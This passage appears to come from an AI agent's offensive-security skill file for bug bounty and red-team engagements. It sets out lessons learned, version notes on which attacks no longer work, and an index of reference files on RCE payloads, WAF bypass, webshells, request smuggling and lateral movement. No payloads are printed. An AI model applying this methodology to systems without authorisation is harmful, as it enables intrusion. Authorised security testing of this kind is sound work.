- Gap report: `/root/Claude-BugHunter-Gap-Report.md` — Full 47-class hunt skill catalogue with unique methodology patterns
- **HackerOne Reports Dataset** (in mission-orchestrator `references/hackerone-reports-dataset.md`): 15 categorized top-100 lists (561KB, 500+ reports) from reddelexc/hackerone-reports. RCE, SSRF, SQLi, IDOR, XSS, ATO, Race Conditions, OAuth, Request Smuggling. Load before web bug bounty engagements for pattern extraction.
- CL.TE/TE.CL: dead on Nginx ≥1.21
- XXE classic: dead on Python lxml ≥5.x (hardened by default)
- PHAR deserialization: dead on PHP ≥8.4

---

## SECTION 7: KEY LESSONS FROM REAL ENGAGEMENTS

1. **Legacy auth endpoints are the highest-value forgotten surface.** wp.com's `/xmlrpc.php` pattern applies to EVERY platform. SharePoint `/_vti_bin/Authentication.asmx` is the WP XMLRPC equivalent. Every branded login UI hides one.

2. **OAuth substring traps.** AADSTS50076 response contains `access_token` as literal text inside JSON — NOT an issued token. Always JSON-parse, never substring-match.

3. **APK acquisition fallback chain.** apkpure/apkmirror truncate downloads. Fallback: Play Store extractor→apkpure→apkmirror with truncation detection.

4. **Don't retract confirmed findings that stop reproducing.** Assume client patched (mid-engagement IR). Timestamped pre-patch PoC IS the finding.

5. **Hygiene findings are NOT bug-bounty findings.** Engagement 01: 5 hygiene→N/A'd. Corrected: 11 impact bugs, 3 Critical.

6. **Echo is not fetch.** SharePoint returned attacker URL in 500 error title. 38 probes, zero callbacks. URL reflection ≠ SSRF.

7. **The mode question is the most important question.** Bug bounty vs Red Team produce fundamentally different decision trees. Answer it before Phase 0.

## SUPPORT FILES

- `references/prometheus-profile-deployment.md` — Recipe for packaging this methodology into a portable, deployable Hermes profile.
- `references/file-upload-to-rce-master-reference.md` — 6-tier extension bypass ladder, MIME/magic byte bypass, server config abuse, polyglots, ZIP slip, race conditions, decision tree. Synthesized from PortSwigger + HackTricks + PayloadsAllTheThings.
- `references/waf-fingerprinting-reference.md` — 50+ vendor fingerprints, SQLi/XSS/file upload/path traversal/command injection bypass techniques, HTTP smuggling as WAF bypass. Source: Awesome-WAF.
- `references/ssti-quick-reference.md` — 10+ template engines with RCE payloads and filter bypass. Source: HackTricks + PayloadsAllTheThings.
- `references/http-request-smuggling-reference.md` — CL.TE/TE.CL/TE.TE, H2 downgrade attacks, Response Queue Poisoning, WAF bypass, detection methodology. Source: James Kettle/PortSwigger Research.
- `references/webshell-inventory.md` — Complete Kali webshell collection (standard + Laudanum + Seclists + BlackArch 216 net-new)
- `references/netexec-capabilities.md` — NetExec v1.5.1 protocol support, credential attacks, lateral movement
- `references/agent-architecture-insights.md` — Hermes + OpenClaw source analysis, fusion architecture, SOUL.md mechanics
- Gap report: `/root/Claude-BugHunter-Gap-Report.md` — Full 47-class hunt skill catalogue with unique methodology patterns
